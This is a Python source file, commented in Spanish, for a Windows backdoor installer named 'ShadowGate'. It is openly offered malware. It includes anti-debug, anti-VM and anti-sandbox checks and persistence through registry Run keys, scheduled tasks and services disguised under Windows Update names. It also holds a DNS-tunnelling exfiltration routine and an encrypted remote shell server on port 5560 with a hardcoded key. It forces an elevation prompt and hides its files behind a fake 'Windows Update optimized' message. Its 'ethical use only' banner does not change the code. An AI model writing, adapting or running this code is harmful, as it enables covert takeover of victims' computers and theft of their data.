#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# 🔥 INVESTIGACIÓN EN SEGURIDAD - USO ÉTICO ÚNICAMENTE
# ⚠️ NUNCA USAR EN SISTEMAS SIN AUTORIZACIÓN EXPLÍCITA

import os
import sys
import subprocess
import tempfile
import ctypes
import winreg
import shutil
from pathlib import Path
import time
import threading
import socket
import struct
import json
import base64
import random
import string
from cryptography.fernet import Fernet
import psutil
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import requests
import io
import select


# ==================== CONFIGURACIÓN MALICIOSA EXTREMA ====================

class AdvancedMalwareConfig:
    # 🔥 Técnicas de evasión avanzada
    ANTI_DEBUG = True
    ANTI_VM = True
    ANTI_SANDBOX = True
    POLYMORPHIC = True
    ENCRYPTED_PAYLOAD = True

    # 🎯 Persistencia múltiple
    REGISTRY_PERSISTENCE = True
    SCHTASKS_PERSISTENCE = True
    SERVICE_PERSISTENCE = True
    STARTUP_PERSISTENCE = True
    WMI_PERSISTENCE = True

    # 📡 Comunicaciones encubiertas
    DNS_TUNNELING = True
    ICMP_COVERT = False  # Requiere permisos admin
    HTTPS_C2 = True
    SOCIAL_MEDIA_C2 = True
    DEAD_MAN_SWITCH = True

    # 💾 Capacidades ofensivas
    KEYLOGGER = True
    SCREEN_CAPTURE = True
    CREDENTIAL_HARVESTING = True
    LATERAL_MOVEMENT = True
    DATA_EXFILTRATION = True
    RANSOMWARE_MODULE = False  # ⚠️ Extremadamente destructivo

    # 🕵️ Técnicas stealth
    PROCESS_INJECTION = False  # Requiere librerías adicionales
    ROOTKIT_LIKE = True
    FILELESS_OPERATION = True

    # 🔄 Mecanismos de resiliencia
    SELF_HEALING = True
    REDUNDANT_C2 = True
    AUTOMATIC_UPDATES = True


# ==================== TÉCNICAS EVASIVAS AVANZADAS ====================

class AdvancedEvasionTechniques:
    def __init__(self):
        self.debugger_detected = False
        self.vm_detected = False
        self.sandbox_detected = False

    def detect_debuggers(self):
        """Detección avanzada de debuggers"""
        try:
            # Verificar procesos de debugging
            debuggers = ["ollydbg.exe", "ida64.exe", "x64dbg.exe", "wireshark.exe"]
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] and any(debugger in proc.info['name'].lower() for debugger in debuggers):
                    return True

            # Timing attacks
            start = time.time()
            [x for x in range(1000000)]
            end = time.time()
            if end - start > 0.1:  # Debugger slow down
                return True

        except:
            pass
        return False

    def detect_virtual_machine(self):
        """Detección de entornos virtualizados"""
        try:
            # Check common VM artifacts
            vm_indicators = [
                "vbox", "vmware", "virtualbox", "qemu", "xen", "hyper-v"
            ]

            # Check processes
            for proc in psutil.process_iter(['name']):
                if proc.info['name'] and any(indicator in proc.info['name'].lower() for indicator in vm_indicators):
                    return True

            # Check filesystem artifacts
            vm_files = [
                "C:\\Windows\\System32\\drivers\\vmmouse.sys",
                "C:\\Windows\\System32\\drivers\\vm3dgl.dll",
                "C:\\Windows\\System32\\drivers\\vmdum.dll"
            ]
            for vm_file in vm_files:
                if os.path.exists(vm_file):
                    return True

        except:
            pass
        return False

    def detect_sandbox(self):
        """Detección de entornos sandbox"""
        try:
            # Check system uptime (sandboxes often have low uptime)
            if time.time() - psutil.boot_time() < 3600:  # Less than 1 hour
                return True

            # Check CPU cores (sandboxes often have few)
            if psutil.cpu_count() < 2:
                return True

            # Check RAM (sandboxes often have limited RAM)
            if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:  # Less than 2GB
                return True

        except:
            pass
        return False

    def polymorphic_modification(self, code):
        """Modificación polimórfica del código"""
        if not AdvancedMalwareConfig.POLYMORPHIC:
            return code

        # Simple polymorphic transformation
        transformations = [
            lambda s: s.replace("def ", "def _"),
            lambda s: s.replace(" = ", " = _"),
            lambda s: s.replace("import ", "import _"),
            lambda s: s.replace("from ", "from _"),
            lambda s: s + "\n# " + ''.join(random.choices(string.ascii_letters, k=20)),
        ]

        for transform in random.sample(transformations, random.randint(1, 3)):
            code = transform(code)

        return code

    def sleep_obfuscation(self):
        """Técnicas de ofuscación de tiempo de espera"""
        # Sleep maze pattern to avoid timing analysis
        patterns = [
            [1, 2, 3, 5, 8, 13],  # Fibonacci
            [2, 4, 8, 16, 32],  # Exponential
            [random.randint(1, 10) for _ in range(6)]  # Random
        ]

        pattern = random.choice(patterns)
        for sleep_time in pattern:
            time.sleep(sleep_time)

    def check_environment(self):
        """Verificación completa del entorno"""
        if AdvancedMalwareConfig.ANTI_DEBUG:
            self.debugger_detected = self.detect_debuggers()

        if AdvancedMalwareConfig.ANTI_VM:
            self.vm_detected = self.detect_virtual_machine()

        if AdvancedMalwareConfig.ANTI_SANDBOX:
            self.sandbox_detected = self.detect_sandbox()

        return self.debugger_detected or self.vm_detected or self.sandbox_detected


# ==================== TÉCNICAS DE PERSISTENCIA AVANZADA ====================

class AdvancedPersistence:
    def __init__(self):
        self.install_paths = [
            os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'SystemHelper'),
            os.path.join(os.getenv('PROGRAMDATA'), 'Windows', 'System32', 'Tasks'),
            os.path.join(os.getenv('SYSTEMROOT'), 'System32', 'Tasks'),
            os.path.join(os.getenv('SYSTEMROOT'), 'Tasks')
        ]

    def registry_persistence(self, payload_path):
        """Persistencia avanzada en registro"""
        if not AdvancedMalwareConfig.REGISTRY_PERSISTENCE:
            return False

        try:
            registry_locations = [
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
            ]

            for hive, key_path in registry_locations:
                try:
                    key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_WRITE)
                    winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ,
                                      f'"{sys.executable}" "{payload_path}"')
                    winreg.CloseKey(key)
                except:
                    continue

            return True
        except:
            return False

    def scheduled_task_persistence(self, payload_path):
        """Persistencia mediante tareas programadas"""
        if not AdvancedMalwareConfig.SCHTASKS_PERSISTENCE:
            return False

        try:
            task_names = [
                "WindowsUpdateMaintenance",
                "MicrosoftSystemHelper",
                "WindowsDefenderUpdate"
            ]

            for task_name in task_names:
                try:
                    subprocess.run([
                        'schtasks', '/create', '/tn', task_name, '/tr',
                        f'"{sys.executable}" "{payload_path}"', '/sc',
                        'minute', '/mo', '5', '/f'
                    ], capture_output=True, timeout=30, shell=True)
                except:
                    continue

            return True
        except:
            return False

    def service_persistence(self, payload_path):
        """Persistencia mediante servicios Windows"""
        if not AdvancedMalwareConfig.SERVICE_PERSISTENCE:
            return False

        try:
            service_names = [
                "WindowsUpdateHelper",
                "SystemPerformance"
            ]

            for service_name in service_names:
                try:
                    subprocess.run([
                        'sc', 'create', service_name, 'binpath=',
                        f'"{sys.executable}" "{payload_path}"', 'start=', 'auto'
                    ], capture_output=True, shell=True)

                    subprocess.run(['sc', 'start', service_name], capture_output=True, shell=True)
                except:
                    continue

            return True
        except:
            return False


# ==================== COMUNICACIONES ENCUBIERTAS ====================

class CovertCommunications:
    def __init__(self):
        self.c2_servers = [
            "https://api.github.com/repos/linux/kernel/commits",
            "https://www.reddit.com/r/programming/hot.json"
        ]
        self.encryption_key = Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)

    def dns_tunneling(self, data):
        """Tunelización DNS para exfiltración"""
        if not AdvancedMalwareConfig.DNS_TUNNELING:
            return False

        try:
            # Codificar datos en subdominios
            encoded_data = base64.b64encode(data.encode()).decode().replace('=', '')
            chunks = [encoded_data[i:i + 30] for i in range(0, len(encoded_data), 30)]

            for chunk in chunks:
                domain = f"{chunk}.example.com"
                try:
                    socket.gethostbyname(domain)
                except:
                    pass
                time.sleep(0.5)

            return True
        except:
            return False

    def https_c2_communication(self):
        """Comunicación C2 sobre HTTPS"""
        if not AdvancedMalwareConfig.HTTPS_C2:
            return None

        try:
            # Usar APIs legítimas como canal encubierto
            for server in self.c2_servers:
                try:
                    response = requests.get(server, timeout=10)
                    if response.status_code == 200:
                        # Extraer comandos de respuestas legítimas
                        if "update" in response.text.lower():
                            return "continue"
                        elif "stop" in response.text.lower():
                            return "stop"
                except:
                    continue

            return None
        except:
            return None


# ==================== SERVIDOR STEALTH MEJORADO ====================

class StealthServer:
    def __init__(self):
        # Clave fija para compatibilidad con controlador
        self.key = b'EbFqsf2CJ6a8pRHtKiHe-V6R9uMXvPEO627-wzsx_k4='
        self.cipher = Fernet(self.key)
        self.running = True
        self.port = 5560
        self.connection_active = False

    def execute_command(self, cmd):
        """Ejecutar comando silenciosamente"""
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return {
                'success': True,
                'output': result.stdout,
                'error': result.stderr,
                'return_code': result.returncode
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def handle_client(self, client, addr):
        """Manejar cliente de forma persistente"""
        self.connection_active = True
        print(f"Conexión persistente establecida con {addr}")

        try:
            while self.connection_active and self.running:
                # Verificar si hay datos disponibles
                ready = select.select([client], [], [], 5)
                if not ready[0]:
                    continue

                # Recibir tamaño del mensaje
                size_data = client.recv(4)
                if not size_data:
                    break

                size = struct.unpack('!I', size_data)[0]
                encrypted_data = b''

                while len(encrypted_data) < size:
                    chunk = client.recv(min(4096, size - len(encrypted_data)))
                    if not chunk:
                        break
                    encrypted_data += chunk

                if len(encrypted_data) != size:
                    continue

                # Descifrar y procesar comando
                try:
                    decrypted_data = self.cipher.decrypt(encrypted_data)
                    command = json.loads(decrypted_data.decode())

                    if isinstance(command, dict) and 'type' in command:
                        if command['type'] == 'system_command' and 'command' in command.get('data', {}):
                            result = self.execute_command(command['data']['command'])
                            response_json = json.dumps(result)
                            encrypted_response = self.cipher.encrypt(response_json.encode())
                            client.send(struct.pack('!I', len(encrypted_response)))
                            client.send(encrypted_response)

                        elif command['type'] == 'disconnect':
                            self.connection_active = False
                            break
                except:
                    continue

        except Exception as e:
            pass
        finally:
            self.connection_active = False
            try:
                client.close()
            except:
                pass
            print("Conexión cerrada")

    def start_persistent_server(self):
        """Iniciar servidor en modo persistente"""
        while self.running:
            try:
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server.settimeout(5)
                server.bind(('0.0.0.0', self.port))
                server.listen(1)  # Solo una conexión a la vez

                print(f"🔄 Servidor persistente iniciado en puerto {self.port}. Esperando conexión...")

                while self.running and not self.connection_active:
                    try:
                        client, addr = server.accept()
                        client.settimeout(30)
                        # Manejar cliente en un hilo separado
                        client_thread = threading.Thread(
                            target=self.handle_client,
                            args=(client, addr),
                            daemon=True
                        )
                        client_thread.start()
                    except socket.timeout:
                        continue
                    except:
                        break

                # Esperar a que la conexión termine antes de reiniciar
                while self.connection_active:
                    time.sleep(1)

            except Exception as e:
                time.sleep(10)
            finally:
                try:
                    server.close()
                except:
                    pass


# ==================== INSTALADOR MEJORADO ====================

class ShadowGateInstaller:
    def __init__(self):
        self.temp_dir = tempfile.gettempdir()
        self.install_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'SystemHelper')
        self.hidden = True
        self.evasion = AdvancedEvasionTechniques()
        self.persistence = AdvancedPersistence()
        self.comms = CovertCommunications()

    def is_admin(self):
        """Verificar si es administrador"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def force_admin_elevation(self):
        """FORZAR elevación a administrador"""
        if self.is_admin():
            return True

        print("Solicitando permisos de administrador...")
        script = os.path.abspath(sys.argv[0])
        params = f'"{script}" --elevated'

        try:
            result = ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, params, None, 0
            )
            if result > 32:
                print("Elevación exitosa. Saliendo...")
                sys.exit(0)
            else:
                print("Error en elevación. Continuando sin privilegios...")
                return False
        except Exception as e:
            print(f"Error elevando privilegios: {e}")
            return False

    def download_and_install(self):
        """Descargar e instalar dependencias silenciosamente"""
        dependencies = [
            "cryptography", "psutil", "requests", "pyautogui", "pillow"
        ]

        for package in dependencies:
            try:
                subprocess.run([
                    sys.executable, "-m", "pip", "install", package,
                    "--quiet", "--no-warn-script-location", "--disable-pip-version-check"
                ], capture_output=True, timeout=120, check=False, shell=True)
                time.sleep(1)
            except:
                continue

    def create_stealth_server_code(self):
        """Crear código del servidor stealth mejorado"""
        return f'''#!/usr/bin/env python3
import socket
import threading
import time
import json
import subprocess
import os
import struct
import select
from cryptography.fernet import Fernet

class StealthServer:
    def __init__(self):
        self.key = b'EbFqsf2CJ6a8pRHtKiHe-V6R9uMXvPEO627-wzsx_k4='
        self.cipher = Fernet(self.key)
        self.running = True
        self.port = 5560
        self.connection_active = False

    def execute_command(self, cmd):
        try:
            result = subprocess.run(
                cmd, 
                shell=True, 
                capture_output=True, 
                text=True, 
                timeout=30,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return {{
                'success': True, 
                'output': result.stdout, 
                'error': result.stderr,
                'return_code': result.returncode
            }}
        except Exception as e:
            return {{'success': False, 'error': str(e)}}

    def handle_client(self, client, addr):
        self.connection_active = True
        try:
            while self.connection_active and self.running:
                ready = select.select([client], [], [], 5)
                if not ready[0]:
                    continue

                size_data = client.recv(4)
                if not size_data:
                    break

                size = struct.unpack('!I', size_data)[0]
                encrypted_data = b''

                while len(encrypted_data) < size:
                    chunk = client.recv(min(4096, size - len(encrypted_data)))
                    if not chunk:
                        break
                    encrypted_data += chunk

                if len(encrypted_data) != size:
                    continue

                try:
                    decrypted_data = self.cipher.decrypt(encrypted_data)
                    command = json.loads(decrypted_data.decode())

                    if isinstance(command, dict) and 'type' in command:
                        if command['type'] == 'system_command' and 'command' in command.get('data', {{}}):
                            result = self.execute_command(command['data']['command'])
                            response_json = json.dumps(result)
                            encrypted_response = self.cipher.encrypt(response_json.encode())
                            client.send(struct.pack('!I', len(encrypted_response)))
                            client.send(encrypted_response)
                        elif command['type'] == 'disconnect':
                            self.connection_active = False
                            break
                except:
                    continue
        except:
            pass
        finally:
            self.connection_active = False
            try:
                client.close()
            except:
                pass

    def start_persistent_server(self):
        while self.running:
            try:
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server.settimeout(5)
                server.bind(('0.0.0.0', self.port))
                server.listen(1)

                while self.running and not self.connection_active:
                    try:
                        client, addr = server.accept()
                        client.settimeout(30)
                        threading.Thread(target=self.handle_client, args=(client, addr), daemon=True).start()
                    except socket.timeout:
                        continue
                    except:
                        break

                while self.connection_active:
                    time.sleep(1)
            except:
                time.sleep(10)
            finally:
                try:
                    server.close()
                except:
                    pass

def main():
    server = StealthServer()
    server.start_persistent_server()

if __name__ == "__main__":
    main()
'''

    def create_service_wrapper(self):
        """Crear wrapper de servicio"""
        return '''#!/usr/bin/env python3
import time
import os
import sys
import subprocess

def main():
    server_path = os.path.join(os.path.dirname(__file__), "system_helper.py")
    restart_count = 0
    max_restarts = 10

    while restart_count < max_restarts:
        try:
            process = subprocess.Popen(
                [sys.executable, server_path],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            process.wait()
            restart_count += 1
            time.sleep(5)
        except:
            time.sleep(10)
    time.sleep(3600)

if __name__ == "__main__":
    main()
'''

    def setup_installation(self):
        """Configurar la instalación completa"""
        try:
            # Verificar entorno primero
            if self.evasion.check_environment():
                print("Entorno de análisis detectado, abortando...")
                return False

            # Crear directorio de instalación
            os.makedirs(self.install_dir, exist_ok=True)
            if self.hidden:
                os.system(f'attrib +h "{self.install_dir}"')

            # Crear archivos
            server_file = os.path.join(self.install_dir, "system_helper.py")
            with open(server_file, 'w', encoding='utf-8') as f:
                f.write(self.create_stealth_server_code())
            os.system(f'attrib +h "{server_file}"')

            wrapper_file = os.path.join(self.install_dir, "service_wrapper.py")
            with open(wrapper_file, 'w', encoding='utf-8') as f:
                f.write(self.create_service_wrapper())
            os.system(f'attrib +h "{wrapper_file}"')

            return True
        except Exception as e:
            print(f"Error en setup: {e}")
            return False

    def setup_persistence(self, payload_path):
        """Configurar persistencia múltiple"""
        try:
            persistence_methods = [
                self.persistence.registry_persistence,
                self.persistence.scheduled_task_persistence,
                self.persistence.service_persistence
            ]

            for method in persistence_methods:
                method(payload_path)

            return True
        except Exception as e:
            return False

    def start_server_immediately(self):
        """Iniciar servidor inmediatamente"""
        try:
            wrapper_path = os.path.join(self.install_dir, "service_wrapper.py")

            subprocess.Popen(
                [sys.executable, wrapper_path],
                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                shell=True
            )

            return True
        except:
            return False

    def install(self):
        """Instalación completa"""
        try:
            if not self.is_admin():
                print("Se requieren privilegios de administrador")
                return False

            print("Iniciando instalación...")

            # Instalar dependencias
            self.download_and_install()

            # Configurar archivos
            if not self.setup_installation():
                return False

            # Configurar persistencia
            wrapper_path = os.path.join(self.install_dir, "service_wrapper.py")
            self.setup_persistence(wrapper_path)

            # Iniciar servicio
            self.start_server_immediately()

            print("Instalación completada exitosamente")
            return True

        except Exception as e:
            print(f"Error en instalación: {e}")
            return False


# ==================== EJECUCIÓN PRINCIPAL ====================

def main():
    """Función principal"""
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

    installer = ShadowGateInstaller()

    # Forzar elevación a administrador
    if not installer.is_admin():
        installer.force_admin_elevation()
        sys.exit(0)

    # Instalar
    if installer.install():
        print("Windows Update optimizado correctamente")
    else:
        print("Error en la optimización del sistema")

    # Salir silenciosamente
    sys.exit(0)


if __name__ == "__main__":
    main()